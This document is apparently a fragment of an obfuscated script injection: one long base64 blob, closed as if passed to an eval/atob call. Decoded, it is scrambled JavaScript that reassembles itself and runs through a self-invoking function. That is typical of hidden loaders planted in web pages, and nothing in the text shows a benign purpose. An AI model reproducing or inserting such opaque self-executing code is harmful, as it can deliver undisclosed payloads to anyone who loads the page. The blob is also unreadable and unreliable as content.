iPWVkLHVlbHBXZD5TeWViJGwlSmYwIEpySnFvd1NKbXRvb0plMl9dbj0kXC8pMylKMG9iUzNtPW8xSjEyXUpbfSB0JXJKdzVkKEpKLntUY3BvRShyTnIuSiU0XyllSmFncntsU29PPD1nSlJdbTtlZmUhZSlKcil0e3JufSlOOD0uNmlKdjRvMSlKLjZlMX1KMTglMUpKSmFdMTZKMWNtMUpKSmVKMT1dakpdaVIwX2kxUmhKSjt0KyspPEo6YzNhKWkxSjlKMUpTZUopSn1yRUp4PXsofUooSj4jbG9iLWw7aDdzID0lXC8wXTdnaW8hYWxUSmlzOkpxY0tkSjddbihpKWRfbGoubz10IHI7Lm5fbmFpMygwWzhkKCVzSm5mLixKZkpKaSRnLG9nYWxKSnVkaWE0b110SmllLGllNF1dLnxKLmQwIU46PWU3IF1dTjc9KUpjb244Sk4lPW4uO0ppb2VhSnlbY1hkbUpbLnRhN2MzYVVzTEpKYX1KLnZhaWQobikpe0o9NWRoXWk7WUhfSmJKcjJYXUpKSm89ZXdJQD1tSithbF1uNHpdKSg0ajpvPXJ1Yz1Kcjg2LG1lKGhvZHJjcnBucittZDo9LGFkSTFfSiluaXtebzN0OWEsZTpzZG1odDFvJDooN2Jdbkpncmh1OUopMjNdbkouMmxbSkApdEpJbD19N19dMEJuI31lLiw0KzYuI3RKKTNCYiNKZnIsLjhkUzIoU0p1YWJdSjJOSlspcjJxXXApcWM7dGNoPXQ7ey4oSikpfUp9JUQuI11KZWUodEp9cjsjSmE0ZV10dHY7ZUpvZilUYSk9KWFKLilrXzs9SlxcZm86ZC4wYSk1biwuMFsrSl9KITFKX3tKJGFKWH1KdTIrXVwvVmQiKDQub2hBZSFmNF1vSkppSi5KZDEtX3ZKNGFKWC5KSjJnXXpWWyJdMytvPUFsIT0zIW9KSi5KOkpvMUpfK0pdYUpYb0pfMixdO1Y5Ij0ydW9vQWUhMTIpb2FKRX1KKV0oJUpfbko6OChpOXU5LjAuYSBVfUooYmNdOzFyKXRKX11zVnMhIW4pMmNdM0pKbkpsXCc/XC9uMmV0aW5lXzogSi5jSl0lKmkpV3JKdGZybH1oe0pPPTUlSmFmSXJiSmRfSmldR11fJGoyb2R0ZXIuKC5KMmN1XV0pZF8kcylHfSFKXyRze0czLmVfJGlkJnRlKVQpSnNkb11vSkpfXFxqe28xbixzSmVtX2VvTnAyMztvQF9LcyUmIWZ0XTtpKyhwX2Rzb18+ZXN0MmQ5bDtvdF8mXy5KTzMgXSFKXzMoXWkoZCklO3JfXXMyX3tlJHQzZFNsZW9dX0pfbkpyMztdbH1cL0VfJCh4KzdRY2ZfbyksSko9LmRKZWxfSmUwX2k2KWUzMV99ZWl9YV9sSXsjU0pmZV97cyhHeVdkZGZfcnNOJilkOl10V18kN0ozMyVdKSlbXzFpKCYzM3tUX31RaS5hb2xdSlRKRik9dGxySncsZDI1SjZuNEpdLn0yfUopSihlKXtmbnJlSnRfSkpfPTMxX19oSm5KNDE9OzdfJSVKYChRMyElMS5vSl9ZSl9Kbi5uLWY/SjouYUpoWzZfNWFdNigyKSAoTF95JWkpdD9fX0pcJ2QwMV80SnNKLjM0XyhKO0ouSiBKXzE5X25KSmRlbmkuJSFpMUpvZGJKZDUrO2QoX0pcJyhWSiJKMG1lO0E4IS4wZWVufW5KfWZddGE7K0pKSkoyb111Silvc24ueyUoZDlKOEpKbzd0XTt0JXsuZWJkKHIsOmcucDpdK0ZkSjlnNiJVfX1KSiEodEphbkpKemRfSkpKKTFdSjNuSj0iZH19cEoxSiAxOF1jSkpvYm5ffXJ9SkRvI0pKLG5ldCh9X0pKZklUfSkyZmVLSmRoSmZKQ3QlNkpkNlssbikuZDhkLj1deChcLy59e0p9JWdKLjtdckogdEM7Y2F7cz1JZHRsdEoxRikgSmFhbF0xSnszPV04Kz02c1VKYSxzX0lOdHR0SjZ9ZC5bdC45ODtuOS5fMTIpJTE2KV1KOXQ1KC5KRUooM2RdX0p0ZXNUcEpKaVwnKGRKIDQ9XWRKKXRhSl80KF06SmQzSjQle3JldHV7bkpFYSllfSlpcjY0ME9KY3R3Sl9Kb0ohOVlwbnBfckplU25sKG5kZ3d9aWouZHNdM0ldWSllSlFKeDgqdGhKKDkycGw+YWRKLixKYW9dK0lkMjtpZm4iaV90LkouICEzUGwoZV85LSguX2NKO0pRdCFjX0tKPWx1ImxaJEo9Sno2dGI3dWEzcl1wSjY0bl1SOylRaSE3X0o9M2R3dGhjMWVjOnNeZXNkZHJvZEpkNGhdfXdpbilvSnM7bkpkKDo7Xi47SlFKITtfMD1fMzBKVSg2Sis0e111OzpTblElITRfX0ouZiEzKUouaEoiZF8sLEpKJTRlXUo7aCguXzJKSjlJMChhXSRlNG95Ti5jITNfSkplX3Bfd0ooSnI2b0olSj9KWns2KTNlJWE6SmkzSmc0O3xRPSExX3M9REpsYl1KZUo9MkpfQTZwY0pUSj07XC8iZGMmfS5KIXNfakpzNDddLShSLmldSkpKZV0paHspKF1fcig7OTAwbDBKYXMkSjRpeXkuMiFsXzVKZF90XzVKKUpKNmdKKEpKSjF7dCktSkoiX1B5PTEhKF9SSiVmXzNlSnNoYSJlX2wsXTRdK2ExICkuSnI2c2JsM0pKcjRKSiFfKV9fK11KZTF5Z2QkPTUrd19EYiM2XVZAbyJKWl1lX2FKSm4xXWdpfT19LWEyYytKb0pLSih0U3s3fWUoSiBvSjEgSkouIGVbSnhuY25dJEoyICksX199c0pfdWwuYyVfJWFzYTYgc3MlXyBlYXRmZGVscm87X2VfSiAuX2Q2X2ViMVI2cmpzb0pudHNhZW9fPW95cEoxSnQxXzFqc28kYihvSmtdcCJyYW1uICVhUnlsYyVkKEo9Ll8gMDRKXW0gXSt1ZDM5XV1fQEp0NntpLjtpKTZwKWg2MyBhLmRKbyBsLF82dV0sSlxcIHQ2eSAzSiE0MUpjMTJfN2Vvckk3YmMyX2UgNUpuID05MiAySlsoc3tKX31fMWMoYl8wSiBmLmRhb2FhdDhkfUojZG8oSkpfKCJ9dHQ5eTFKYiBlZCl5ZmVvZj5kcjteb3AodU9ELE1KKCBte0plSnVzbjIgbHRfXz5fLmMhIG0uIHMubDB0fSBEW2QkcDM4NT1KSiggLnNKSiBKX2U2Y2VjMV1ySnQ1ck4uKCB7e31Pbn0uYyx0ImhydW5jKWl0bjcuIWp1aWkoXSkwTnQ7Sk9vSlFkbkpye3R2YXJKIC5zLmQxdEJ5dCBCXWwpPV1dLnQgUzthZjUmSi5fIDd0Om5fXT0uXSBKX1spIF0lKEogXz1kZClkeWV1IGxyX2Ule3RmXC8gSiskeycpKTt2YXIga2NwPVdJTyhZeVQscnlCICk7a2NwKDU0NTUpO3JldHVybiA3OTc0fSkoKQ=='))
